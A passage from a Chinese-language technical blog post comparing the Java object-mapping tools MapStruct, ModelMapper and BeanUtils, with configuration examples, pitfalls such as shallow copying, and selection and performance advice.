<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Mapper</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">SafeUserConverter</span> &#123;</span><br><span class="line">    <span class="meta">@BeanMapping(ignoreByDefault = true)</span></span><br><span class="line">    <span class="meta">@Mapping(source = &quot;id&quot;, target = &quot;userId&quot;)</span></span><br><span class="line">    <span class="meta">@Mapping(source = &quot;name&quot;, target = &quot;username&quot;)</span></span><br><span class="line">    UserVO <span class="title function_">toVO</span><span class="params">(User user)</span>; <span class="comment">// 只有 userId 和 username 会被映射</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h4 id="2-1-5-优缺点"><a href="#2-1-5-优缺点" class="headerlink" title="2.1.5 优缺点"></a>2.1.5 优缺点</h4><ul>
<li><strong>优点</strong>:<ul>
<li><strong>性能极致</strong>: 零运行时开销，性能等同于手写 <code>getter/setter</code>。</li>
<li><strong>类型安全</strong>: 所有映射在编译期完成，任何不匹配（类型、名称）都会导致编译失败，提前暴露问题。</li>
<li><strong>代码清晰</strong>: 映射逻辑集中在 <code>Mapper</code> 接口中，一目了然，将转换逻辑与业务逻辑彻底分离。</li>
<li><strong>功能强大</strong>: 支持各种复杂场景，如嵌套、表达式、更新目标、复用等。</li>
<li><strong>自动生成</strong>: 无需编写枯燥的样板代码。</li>
</ul>
</li>
<li><strong>缺点</strong>:<ul>
<li><strong>初始配置</strong>: 需要在 <code>pom.xml</code> 或 <code>build.gradle</code> 中正确配置 annotation processor，对新手有一定门槛。</li>
<li><strong>学习曲线</strong>: 虽然基础用法简单，但高级特性的注解较多，需要花时间学习。</li>
<li><strong>调试</strong>: 当出现问题时，有时需要查看和理解自动生成的实现类代码，这比调试手写代码稍微曲折一些。</li>
<li><strong>轻微冗余</strong>: 对于只有一两个字段的极简单转换，专门创建一个 <code>Mapper</code> 接口可能显得有些“重”。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="2-2-ModelMapper"><a href="#2-2-ModelMapper" class="headerlink" title="2.2 ModelMapper"></a>2.2 ModelMapper</h3><h4 id="2-2-1-核心思想"><a href="#2-2-1-核心思想" class="headerlink" title="2.2.1 核心思想"></a>2.2.1 核心思想</h4><p>ModelMapper 的设计哲学是 <strong>“智能匹配，快速上手”</strong>。它在**运行时（Runtime）<strong>工作，通过</strong>反射（Reflection）**来动态地读取源对象的属性，并写入目标对象。</p>
<p>它的“智能”体现在其强大的<strong>命名约定匹配策略</strong>上。ModelMapper 会尝试理解属性的层次结构，例如，它能自动将源对象的 <code>user.address.city</code> 属性映射到目标对象的 <code>userAddressCity</code> 属性。这种能力使得在遵循特定命名规范时，开发者几乎不需要编写任何映射配置，大大提升了开发效率。</p>
<hr>
<h4 id="2-2-2-快速上手"><a href="#2-2-2-快速上手" class="headerlink" title="2.2.2 快速上手"></a>2.2.2 快速上手</h4><p><strong>第一步：引入依赖 (Maven)</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.modelmapper<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>modelmapper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span> <span class="comment">&lt;!-- 使用最新稳定版 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>第二步：配置为 Spring Bean (推荐)</strong></p>
<p>为了在整个应用中共享同一个 <code>ModelMapper</code> 实例及其配置，通常会将其声明为一个 Spring Bean。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ModelMapperConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> ModelMapper <span class="title function_">modelMapper</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">ModelMapper</span> <span class="variable">modelMapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ModelMapper</span>();</span><br><span class="line">        <span class="comment">// 在这里进行全局配置</span></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        <span class="keyword">return</span> modelMapper;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>第三步：使用 <code>map</code> 方法</strong></p>
<p>通过 <code>@Autowired</code> 注入后，就可以在 Service 或 Controller 中使用了。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 假设有 User 和 UserDTO</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="comment">// getters/setters</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserDTO</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="comment">// getters/setters</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> ModelMapper modelMapper;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> UserDTO <span class="title function_">getUser</span><span class="params">(Long userId)</span> &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> userRepository.findById(userId).orElse(<span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">if</span> (user == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 最简单的用法：一行代码完成转换</span></span><br><span class="line">        <span class="type">UserDTO</span> <span class="variable">dto</span> <span class="operator">=</span> modelMapper.map(user, UserDTO.class);</span><br><span class="line">        <span class="keyword">return</span> dto;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>核心</strong>: <code>modelMapper.map(sourceObject, DestinationClass.class)</code> 是最核心、最常用的方法。</p>
</blockquote>
<hr>
<h4 id="2-2-3-核心配置"><a href="#2-2-3-核心配置" class="headerlink" title="2.2.3 核心配置"></a>2.2.3 核心配置</h4><ul>
<li><p><strong><code>setMatchingStrategy(MatchingStrategies.STRICT)</code></strong>: <strong>这是最重要的配置，强烈推荐！</strong></p>
<ul>
<li><strong>背景</strong>: ModelMapper 默认的匹配策略是 <code>STANDARD</code>，它比较智能但有时会过于“热情”。例如，它可能会将源对象 <code>order.customer.name</code> 错误地匹配到目标对象的 <code>name</code> 字段上，导致难以察觉的数据污染。</li>
<li><strong><code>STRICT</code> 策略</strong>: 该策略要求源和目标的属性路径必须完全相同。例如，<code>source.name</code> 只能匹配到 <code>target.name</code>，而 <code>source.customer.name</code> 只能匹配到 <code>target.customer.name</code>。这极大地提高了映射的准确性和可预测性，避免了“魔法”带来的副作用。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> ModelMapper <span class="title function_">modelMapper</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">ModelMapper</span> <span class="variable">modelMapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ModelMapper</span>();</span><br><span class="line">    modelMapper.getConfiguration()</span><br><span class="line">               .setMatchingStrategy(MatchingStrategies.STRICT);</span><br><span class="line">    <span class="keyword">return</span> modelMapper;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>使用 <code>TypeMap</code> 和 <code>Converter</code> 自定义复杂映射规则</strong>: 当智能匹配无法满足需求时（如属性名不同、类型需要特殊转换），就需要手动配置。<br><strong>示例：</strong> 将 <code>User</code> 的 <code>firstName</code> 和 <code>lastName</code> 合并为 <code>UserDTO</code> 的 <code>fullName</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在 ModelMapper 的配置中添加</span></span><br><span class="line">TypeMap&lt;User, UserDTO&gt; typeMap = modelMapper.createTypeMap(User.class, UserDTO.class);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个转换器</span></span><br><span class="line">Converter&lt;User, String&gt; fullNameConverter = context -&gt; &#123;</span><br><span class="line">    <span class="type">User</span> <span class="variable">source</span> <span class="operator">=</span> context.getSource();</span><br><span class="line">    <span class="keyword">return</span> source.getFirstName() + <span class="string">&quot; &quot;</span> + source.getLastName();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 为 DTO 的 fullName 字段应用这个转换器</span></span><br><span class="line">typeMap.addMappings(mapper -&gt; mapper.using(fullNameConverter).map(src -&gt; src, UserDTO::setFullName));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果只是简单的属性名不同</span></span><br><span class="line"><span class="comment">// typeMap.addMappings(mapper -&gt; mapper.map(User::getCreationDate, UserDTO::setRegisterDate));</span></span><br></pre></td></tr></table></figure>

<p>这个过程虽然比 MapStruct 的注解要繁琐，但也提供了足够的灵活性来处理各种复杂情况。</p>
</li>
</ul>
<hr>
<h4 id="2-2-4-优缺点"><a href="#2-2-4-优缺点" class="headerlink" title="2.2.4 优缺点"></a>2.2.4 优缺点</h4><ul>
<li><strong>优点</strong>:<ul>
<li><strong>上手极快</strong>: API 非常简洁直观，对于简单的对象映射，几乎是零配置。</li>
<li><strong>无需额外构建配置</strong>: 作为一个普通的库，只需要添加依赖即可，不像 MapStruct 需要配置 annotation processor。</li>
<li><strong>灵活性高</strong>: 运行时的特性使其可以处理动态模型，或在不重新编译的情况下改变映射逻辑（尽管不推荐这样做）。</li>
<li><strong>非常适合快速原型开发</strong>: 在项目初期、内部工具或对性能不极度敏感的场景下，能极大地提升开发速度。</li>
</ul>
</li>
<li><strong>缺点</strong>:<ul>
<li><strong>性能开销</strong>: <strong>这是其最主要的缺点</strong>。基于反射的实现意味着在运行时有额外的性能损耗，在高并发、大数据量或性能敏感的路径中，其开销会比 MapStruct 高出一个数量级甚至更多。</li>
<li><strong>类型不安全，错误后置</strong>: 映射逻辑中的任何错误（如属性名写错、类型不兼容）都<strong>不会在编译期被发现</strong>。只有当代码运行到 <code>map</code> 方法时，才会以 <code>MappingException</code> 等运行时异常的形式抛出。这使得应用的<strong>反馈周期变长</strong>，增加了调试难度。</li>
<li><strong>“魔法”行为</strong>: 默认的智能匹配有时会产生意想不到的映射结果，如果不出问题则很方便，一旦出问题则难以排查，因此强烈推荐使用 <code>STRICT</code> 模式来减少这种“魔法”。</li>
<li><strong>重构不友好</strong>: 如果你修改了某个类的属性名，IDE 的重构工具无法自动更新 ModelMapper 配置中的字符串形式的映射规则，容易引入错误。而 MapStruct 因为是纯 Java 代码，可以被 IDE 完美支持。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="2-3-Apache-Spring-BeanUtils"><a href="#2-3-Apache-Spring-BeanUtils" class="headerlink" title="2.3 Apache&#x2F;Spring BeanUtils"></a>2.3 Apache&#x2F;Spring BeanUtils</h3><p><code>BeanUtils</code> 就像是工具箱里一把非常古老且锋利的双刃剑。它看起来简单直接，但稍有不慎就会伤到自己。它主要有两个广为人知的实现：<code>org.springframework.beans.BeanUtils</code> 和 <code>org.apache.commons.beanutils.BeanUtils</code>。</p>
<h4 id="2-3-1-核心思想"><a href="#2-3-1-核心思想" class="headerlink" title="2.3.1 核心思想"></a>2.3.1 核心思想</h4><p>它的工作机制非常机械和原始：在<strong>运行时</strong>，通过<strong>反射</strong>遍历源对象（<code>source</code>）所有公开的 <code>getter</code> 方法。对于每一个 <code>getProperty()</code> 方法，它会提取出属性名 <code>property</code>，然后在目标对象（<code>target</code>）上寻找一个名为 <code>setProperty()</code> 且参数类型兼容的 <code>setter</code> 方法，并执行调用。</p>
<p>这个过程完全基于<strong>方法签名的约定</strong>，不关心业务含义，也没有任何“智能”可言。</p>
<hr>
<h4 id="2-3-2-用法"><a href="#2-3-2-用法" class="headerlink" title="2.3.2 用法"></a>2.3.2 用法</h4><p>用法极其简单，但也因此埋下了第一个坑：</p>
<ul>
<li><p><strong>Spring Framework:</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.beans.BeanUtils;</span><br><span class="line">BeanUtils.copyProperties(source, target);</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Apache Commons:</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanUtils;</span><br><span class="line">BeanUtils.copyProperties(target, source); <span class="comment">// 注意！参数顺序是反的！</span></span><br></pre></td></tr></table></figure></li>
</ul>
<blockquote>
<p><strong>警告</strong>: Apache Commons 和 Spring 的 <code>BeanUtils.copyProperties</code> 方法的<strong>参数顺序是相反的</strong>。无数开发者曾因此犯错，将一个空的目标对象（<code>target</code>）的属性“拷贝”到了有数据的源对象（<code>source</code>）上，导致源数据被意外清空，且<strong>没有任何异常</strong>。这是使用它时第一个需要警惕的陷阱。</p>
</blockquote>
<hr>
<h4 id="2-3-3-存在的陷阱"><a href="#2-3-3-存在的陷阱" class="headerlink" title="2.3.3 存在的陷阱"></a>2.3.3 存在的陷阱</h4><ul>
<li><p><strong>1. 浅拷贝 (Shallow Copy): 引用类型只复制地址，不复制内容</strong><br>这是 <code>BeanUtils</code> 最危险、最隐蔽的陷阱。它不会递归地复制对象，只会复制引用。</p>
<p><strong>灾难场景示例：</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Order</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String id;</span><br><span class="line">    <span class="keyword">private</span> List&lt;String&gt; items;</span><br><span class="line">    <span class="comment">// getters/setters</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">Order</span> <span class="variable">sourceOrder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Order</span>();</span><br><span class="line">sourceOrder.setId(<span class="string">&quot;Order123&quot;</span>);</span><br><span class="line">sourceOrder.setItems(<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(Arrays.asList(<span class="string">&quot;Apple&quot;</span>, <span class="string">&quot;Banana&quot;</span>)));</span><br><span class="line"></span><br><span class="line"><span class="type">Order</span> <span class="variable">targetOrder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Order</span>();</span><br><span class="line">BeanUtils.copyProperties(sourceOrder, targetOrder);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 现在，我们修改一下源对象的 items 列表</span></span><br><span class="line">sourceOrder.getItems().add(<span class="string">&quot;Cherry&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查目标对象，你会发现它也被修改了！</span></span><br><span class="line">System.out.println(targetOrder.getItems()); <span class="comment">// 输出: [Apple, Banana, Cherry]</span></span><br></pre></td></tr></table></figure>

<p><strong>原因</strong>: <code>copyProperties</code> 并没有为 <code>targetOrder</code> 创建一个新的 <code>ArrayList</code>。它只是把 <code>sourceOrder.items</code> 这个引用的地址（指向内存中同一个 <code>ArrayList</code> 实例）复制给了 <code>targetOrder.items</code>。因此，<code>sourceOrder</code> 和 <code>targetOrder</code> 内部的 <code>items</code> 属性指向的是<strong>同一个列表对象</strong>。对任何一方的修改都会影响另一方，这在并发环境或复杂的业务流中是灾难性的。</p>
</li>
<li><p><strong>2. 类型不匹配: 静默失败 vs. 突兀异常</strong><br>当源和目标的属性类型不完全一致时，不同实现的表现也不同：</p>
<ul>
<li><strong>Spring <code>BeanUtils</code></strong>: 会尝试进行一些基本的类型转换。例如，<code>String</code> 可以被尝试转为 <code>Integer</code> 或 <code>Long</code>。但如果转换失败（比如将 <code>&quot;abc&quot;</code> 转为 <code>Integer</code>），它<strong>默认会静默地跳过这个属性</strong>，不会抛出异常。这种“静默失败”非常危险，因为它会让你误以为拷贝成功了，但实际上数据已经丢失。</li>
<li><strong>Apache Commons <code>BeanUtils</code></strong>: 它也支持类型转换（通过 <code>ConvertUtils</code>），但配置更复杂，且在转换失败时通常会抛出异常。抛出异常虽然会中断程序，但它明确地暴露了问题，比静默失败要安全得多。</li>
</ul>
</li>
<li><p><strong>3. 命名陷阱: <code>isSuccess()</code> vs <code>getSuccess()</code></strong><br>Java Bean 规范对 <code>boolean</code> 类型的 <code>getter</code> 方法有特殊的命名约定，即 <code>isProperty()</code>。如果源对象和目标对象在这个约定上不统一，拷贝就会失败。</p>
<ul>
<li><strong>源对象 (标准)</strong>: <code>private boolean success; public boolean isSuccess() { ... }</code></li>
<li><strong>目标对象 (不小心写错)</strong>: <code>private boolean success; public boolean getSuccess() { ... }</code><br>在这种情况下，<code>BeanUtils</code> 在源对象上找不到名为 <code>getSuccess()</code> 的方法，于是就直接跳过了 <code>success</code> 属性的拷贝，同样是静默的。</li>
</ul>
</li>
<li><p><strong>4. 性能较差: 纯反射的代价</strong><br>由于完全依赖于运行时的反射，<code>BeanUtils</code> 在性能上是所有工具中最差的。它需要在运行时查找方法、检查类型、动态调用，这些操作的开销远大于直接的方法调用。在需要处理大量对象或在高并发场景下，它会成为明显的性能瓶颈。</p>
</li>
</ul>
<hr>
<h4 id="2-3-4-结论"><a href="#2-3-4-结论" class="headerlink" title="2.3.4 结论"></a>2.3.4 结论</h4><p><code>BeanUtils</code> 是一个应该被严格限制使用的工具。它看似便捷，实则布满了难以察觉的陷阱。</p>
<p><strong>只应在满足以下所有条件时，才可“考虑”使用：</strong></p>
<ol>
<li>源对象和目标对象是<strong>扁平的</strong>（没有嵌套的自定义对象或集合）。</li>
<li>你<strong>100%确定</strong>所有需要拷贝的属性，其<strong>名称和类型都完全一致</strong>。</li>
<li>该操作处于<strong>性能不敏感</strong>的非核心路径（如一次性的数据迁移脚本、简单的后台管理功能）。</li>
<li>整个团队都了解其“浅拷贝”的风险。</li>
</ol>
<p><strong>强烈建议</strong>: <strong>在任何新项目或核心业务逻辑中，严禁将其作为主要的对象转换方案。</strong> 优先选择 <strong>MapStruct</strong> 以获得最佳性能和类型安全，或在快速开发时使用配置为严格模式的 <strong>ModelMapper</strong>。把 <code>BeanUtils</code> 当作历史遗物，了解它的问题，但避免在生产代码中使用它。</p>
<hr>
<h2 id="3-选型策略与架构最佳实践"><a href="#3-选型策略与架构最佳实践" class="headerlink" title="3. 选型策略与架构最佳实践"></a>3. 选型策略与架构最佳实践</h2><h3 id="3-1-技术选型决策树"><a href="#3-1-技术选型决策树" class="headerlink" title="3.1 技术选型决策树"></a>3.1 技术选型决策树</h3><p>在面对不同的项目需求和场景时，可以遵循以下决策树来选择最合适的工具：</p>
<ul>
<li><strong>场景一：追求极致性能、需要长期维护、强调团队协作规范的核心项目</strong><ul>
<li><strong>推荐方案：<code>MapStruct</code></strong></li>
<li><strong>理由：</strong> MapStruct通过在编译期生成Java代码，实现了与手写<code>get/set</code>几乎无异的性能，避免了反射带来的运行时开销。其基于接口和注解的方式，提供了编译时类型安全检查，任何属性不匹配都会在编译阶段报错，极大地提升了代码的健壮性。对于团队而言，统一的Mapper接口规范有助于保持代码风格一致，便于维护和交接。</li>
</ul>
</li>
<li><strong>场景二：快速原型开发、内部管理后台、或业务逻辑简单的中小型项目</strong><ul>
<li><strong>推荐方案：<code>ModelMapper</code> (并配置为严格模式 <code>MatchingStrategies.STRICT</code>)</strong></li>
<li><strong>理由：</strong> ModelMapper “约定优于配置” 的设计哲学使其上手极快，无需编写具体实现即可完成大部分转换，极大地提升了开发效率。但为了避免因属性名相似而导致的意外映射，强烈建议配置为严格模式。虽然其性能不及MapStruct，但在QPS（每秒查询率）要求不高的场景下，这点性能开销通常可以接受。</li>
</ul>
</li>
<li><strong>场景三：临时性、小范围的数据拷贝，且源和目标对象的属性完全相同</strong><ul>
<li><strong>推荐方案：<code>BeanUtils</code> (如 <code>Spring BeanUtils</code> 或 <code>Apache Commons BeanUtils</code>)</strong></li>
<li><strong>理由：</strong> 当你只需要快速拷贝几个属性，并且确信这些属性的名称和类型完全一致时，<code>BeanUtils</code> 是最便捷的选择。但必须清楚地认识到它的风险：<ul>
<li><strong>浅拷贝问题</strong>：只会拷贝引用，不会深拷贝内部的集合或对象。</li>
<li><strong>类型不匹配</strong>：如果类型不匹配，可能会在运行时抛出异常。</li>
<li><strong>静默失败</strong>：如果属性名在未来的重构中被修改，<code>BeanUtils</code> 不会报错，而是会静默地跳过该属性的拷贝，这可能导致难以追踪的Bug。</li>
<li>因此，它只应被用在“一次性”或非常受控的简单场景中。</li>
</ul>
</li>
</ul>
</li>
<li><strong>场景四：转换逻辑极其复杂，或仅涉及一两个字段</strong><ul>
<li><strong>推荐方案：</strong> <strong>手动编写 <code>set/get</code></strong></li>
<li><strong>理由：</strong> 返璞归真，当转换逻辑包含复杂的业务判断、计算或需要调用其他服务时，任何自动化工具都会变得笨拙。此时，手写代码是最清晰、最直接、最易于调试和理解的方式。同样，如果仅仅是转换一两个字段，引入一个库的成本可能比手写更高。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="3-2-Converter-Mapper层的设计"><a href="#3-2-Converter-Mapper层的设计" class="headerlink" title="3.2 Converter&#x2F;Mapper层的设计"></a>3.2 Converter&#x2F;Mapper层的设计</h3><p>在架构中引入独立的转换层，是保证代码结构清晰、职责分离的重要实践。</p>
<ul>
<li><strong>统一存放，明确职责</strong><ul>
<li>在项目中创建专门的包来存放所有的转换器，例如 <code>com.yourcompany.project.converter</code> 或 <code>com.yourcompany.project.mapper</code>。这使得转换逻辑集中管理，方便查找和复用，也清晰地表明了这一层的职责——只做数据结构转换。</li>
</ul>
</li>
<li><strong>拥抱依赖注入，与框架集成</strong><ul>
<li>将MapStruct的Mapper接口声明为Spring组件 (<code>@Mapper(componentModel = &quot;spring&quot;)</code>)。这样做的好处是，你可以像注入其他Service或Repository一样，在业务逻辑层（Service）通过 <code>@Autowired</code> 或构造函数注入你的Mapper。这遵循了面向接口编程和依赖倒置原则，使代码更加松耦合，易于测试。</li>
</ul>
</li>
<li><strong>保持纯粹，杜绝业务逻辑</strong><ul>
<li>转换器（Converter&#x2F;Mapper）的核心原则是<strong>保持纯粹性</strong>。它的唯一职责是将数据从一种形式（如Entity）转换为另一种形式（如DTO），反之亦然。<strong>严禁</strong>在转换器内部执行数据库查询、调用外部API或嵌入复杂的业务规则。任何需要额外数据的逻辑，都应该在Service层准备好数据后，再作为参数传入Mapper的方法。</li>
</ul>
</li>
<li><strong>为复杂逻辑编写单元测试</strong><ul>
<li>对于简单的同名属性映射，可以信任工具的可靠性。但只要你使用了自定义映射逻辑，例如 <code>@Mapping(expression=&quot;...&quot;)</code>、<code>@Mapping(qualifiedByName=&quot;...&quot;)</code> 或任何自定义方法，就<strong>必须</strong>为其编写单元测试。单元测试可以确保：<ul>
<li>你的自定义逻辑按预期工作。</li>
<li>在未来对Entity或DTO进行重构时</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="3-3-性能考量总结"><a href="#3-3-性能考量总结" class="headerlink" title="3.3 性能考量总结"></a>3.3 性能考量总结</h3><p>性能是后端服务架构中一个无法回避的话题，尤其是在高并发或大数据量处理的场景下。不同的DTO转换方案在性能上存在显著差异，其根源在于实现原理的不同。</p>
<ul>
<li><strong>代码生成 (MapStruct): 性能之王</strong><ul>
<li><strong>原理</strong>: MapStruct在Java编译阶段（<code>mvn compile</code>或IDE构建时）自动生成<code>get/set</code>调用的Java实现类。这意味着在程序运行时，调用一个MapStruct的Mapper方法，其本质与直接调用手写的<code>get/set</code>代码完全相同。</li>
<li><strong>性能表现</strong>: 性能与手写代码持平，几乎是“零成本”转换。由于生成的是原生Java代码，JVM的JIT（即时编译器）可以对其进行充分的内联和优化，达到极致的执行效率。</li>
<li><strong>结论</strong>: 在性能层面，MapStruct是无可争议的最优选择。</li>
</ul>
</li>
<li><strong>反射 (ModelMapper, BeanUtils): 便利性与性能的权衡</strong><ul>
<li><strong>原理</strong>: 这类工具在程序运行时，通过Java的反射API动态地分析源对象和目标对象的类结构，查找名称匹配的<code>get</code>和<code>set</code>方法，然后进行动态调用。这个过程包括查找方法、检查访问权限、参数匹配和调用等一系列步骤，比直接的方法调用要复杂得多。</li>
<li><strong>性能表现</strong>:<ul>
<li><strong>存在数量级的差距</strong>: 与编译期生成的代码相比，基于反射的调用通常会慢上一个甚至多个数量级。虽然现代JVM对反射做了一些优化，但其固有的运行时查找开销是无法消除的。</li>
<li><strong>高并发下影响放大</strong>: 在低QPS（每秒请求数）场景下，这种微秒级的延迟可能无伤大雅。但在高并发场景中，每一次请求都包含的这点额外开销会迅速累积，成为系统的明显瓶颈，导致CPU使用率升高和响应时间（RT）延长。</li>
</ul>
</li>
<li><strong>结论</strong>: 使用反射工具是以牺牲部分运行时性能为代价，换取开发阶段的便利性。</li>
</ul>
</li>
</ul>
<p><strong>性能排序与最佳实践</strong></p>
<p>综合来看，它们的性能排名非常清晰：</p>
<p><strong>手写代码 ≈ MapStruct &gt;&gt; ModelMapper &gt; BeanUtils</strong></p>
<ul>
<li><em>注：ModelMapper 通常比 <code>BeanUtils</code> 稍快，因为它内部实现了一些缓存机制来优化反射调用。</em></li>
</ul>
<p><strong>最佳实践指南:</strong></p>
<ol>
<li><strong>核心路径，性能优先</strong>: 在项目的<strong>核心业务流程</strong>和<strong>性能敏感路径</strong>上（例如，用户请求的主流程、高并发的API接口、大数据量的批量处理任务），<strong>应优先且强制使用MapStruct</strong>。这是一种面向未来的投资，可以从根本上避免未来可能出现的性能瓶颈。</li>
<li><strong>非核心路径，效率优先</strong>: 在一些非核心、低流量的场景中，例如<strong>内部管理后台、一次性数据迁移脚本、快速原型验证</strong>等，开发效率的重要性可能高于极致的性能。在这些场景下，使用 <code>ModelMapper</code> 来加速开发是完全合理且值得推荐的。</li>
<li><strong>避免滥用 <code>BeanUtils</code></strong>: 鉴于 <code>BeanUtils</code> 的静默失败风险和相对较低的性能，应尽量减少其使用。只在确信源和目标完全一致，且属于临时性、非关键代码的场景下偶尔为之。</li>
</ol>
<hr>
<h1 id="四、其它"><a href="#四、其它" class="headerlink" title="四、其它"></a>四、其它</h1><h2 id="1-Apache-Commons"><a href="#1-Apache-Commons" class="headerlink" title="1. Apache Commons"></a>1. Apache Commons</h2><h3 id="1-1-简介"><a href="#1-1-简介" class="headerlink" title="1.1 简介"></a>1.1 简介</h3><p><strong>Apache Commons 是一个专注于可重用 Java 组件的 Apache 开源项目</strong>。</p>
<p><strong>核心理念：</strong></p>
<ul>
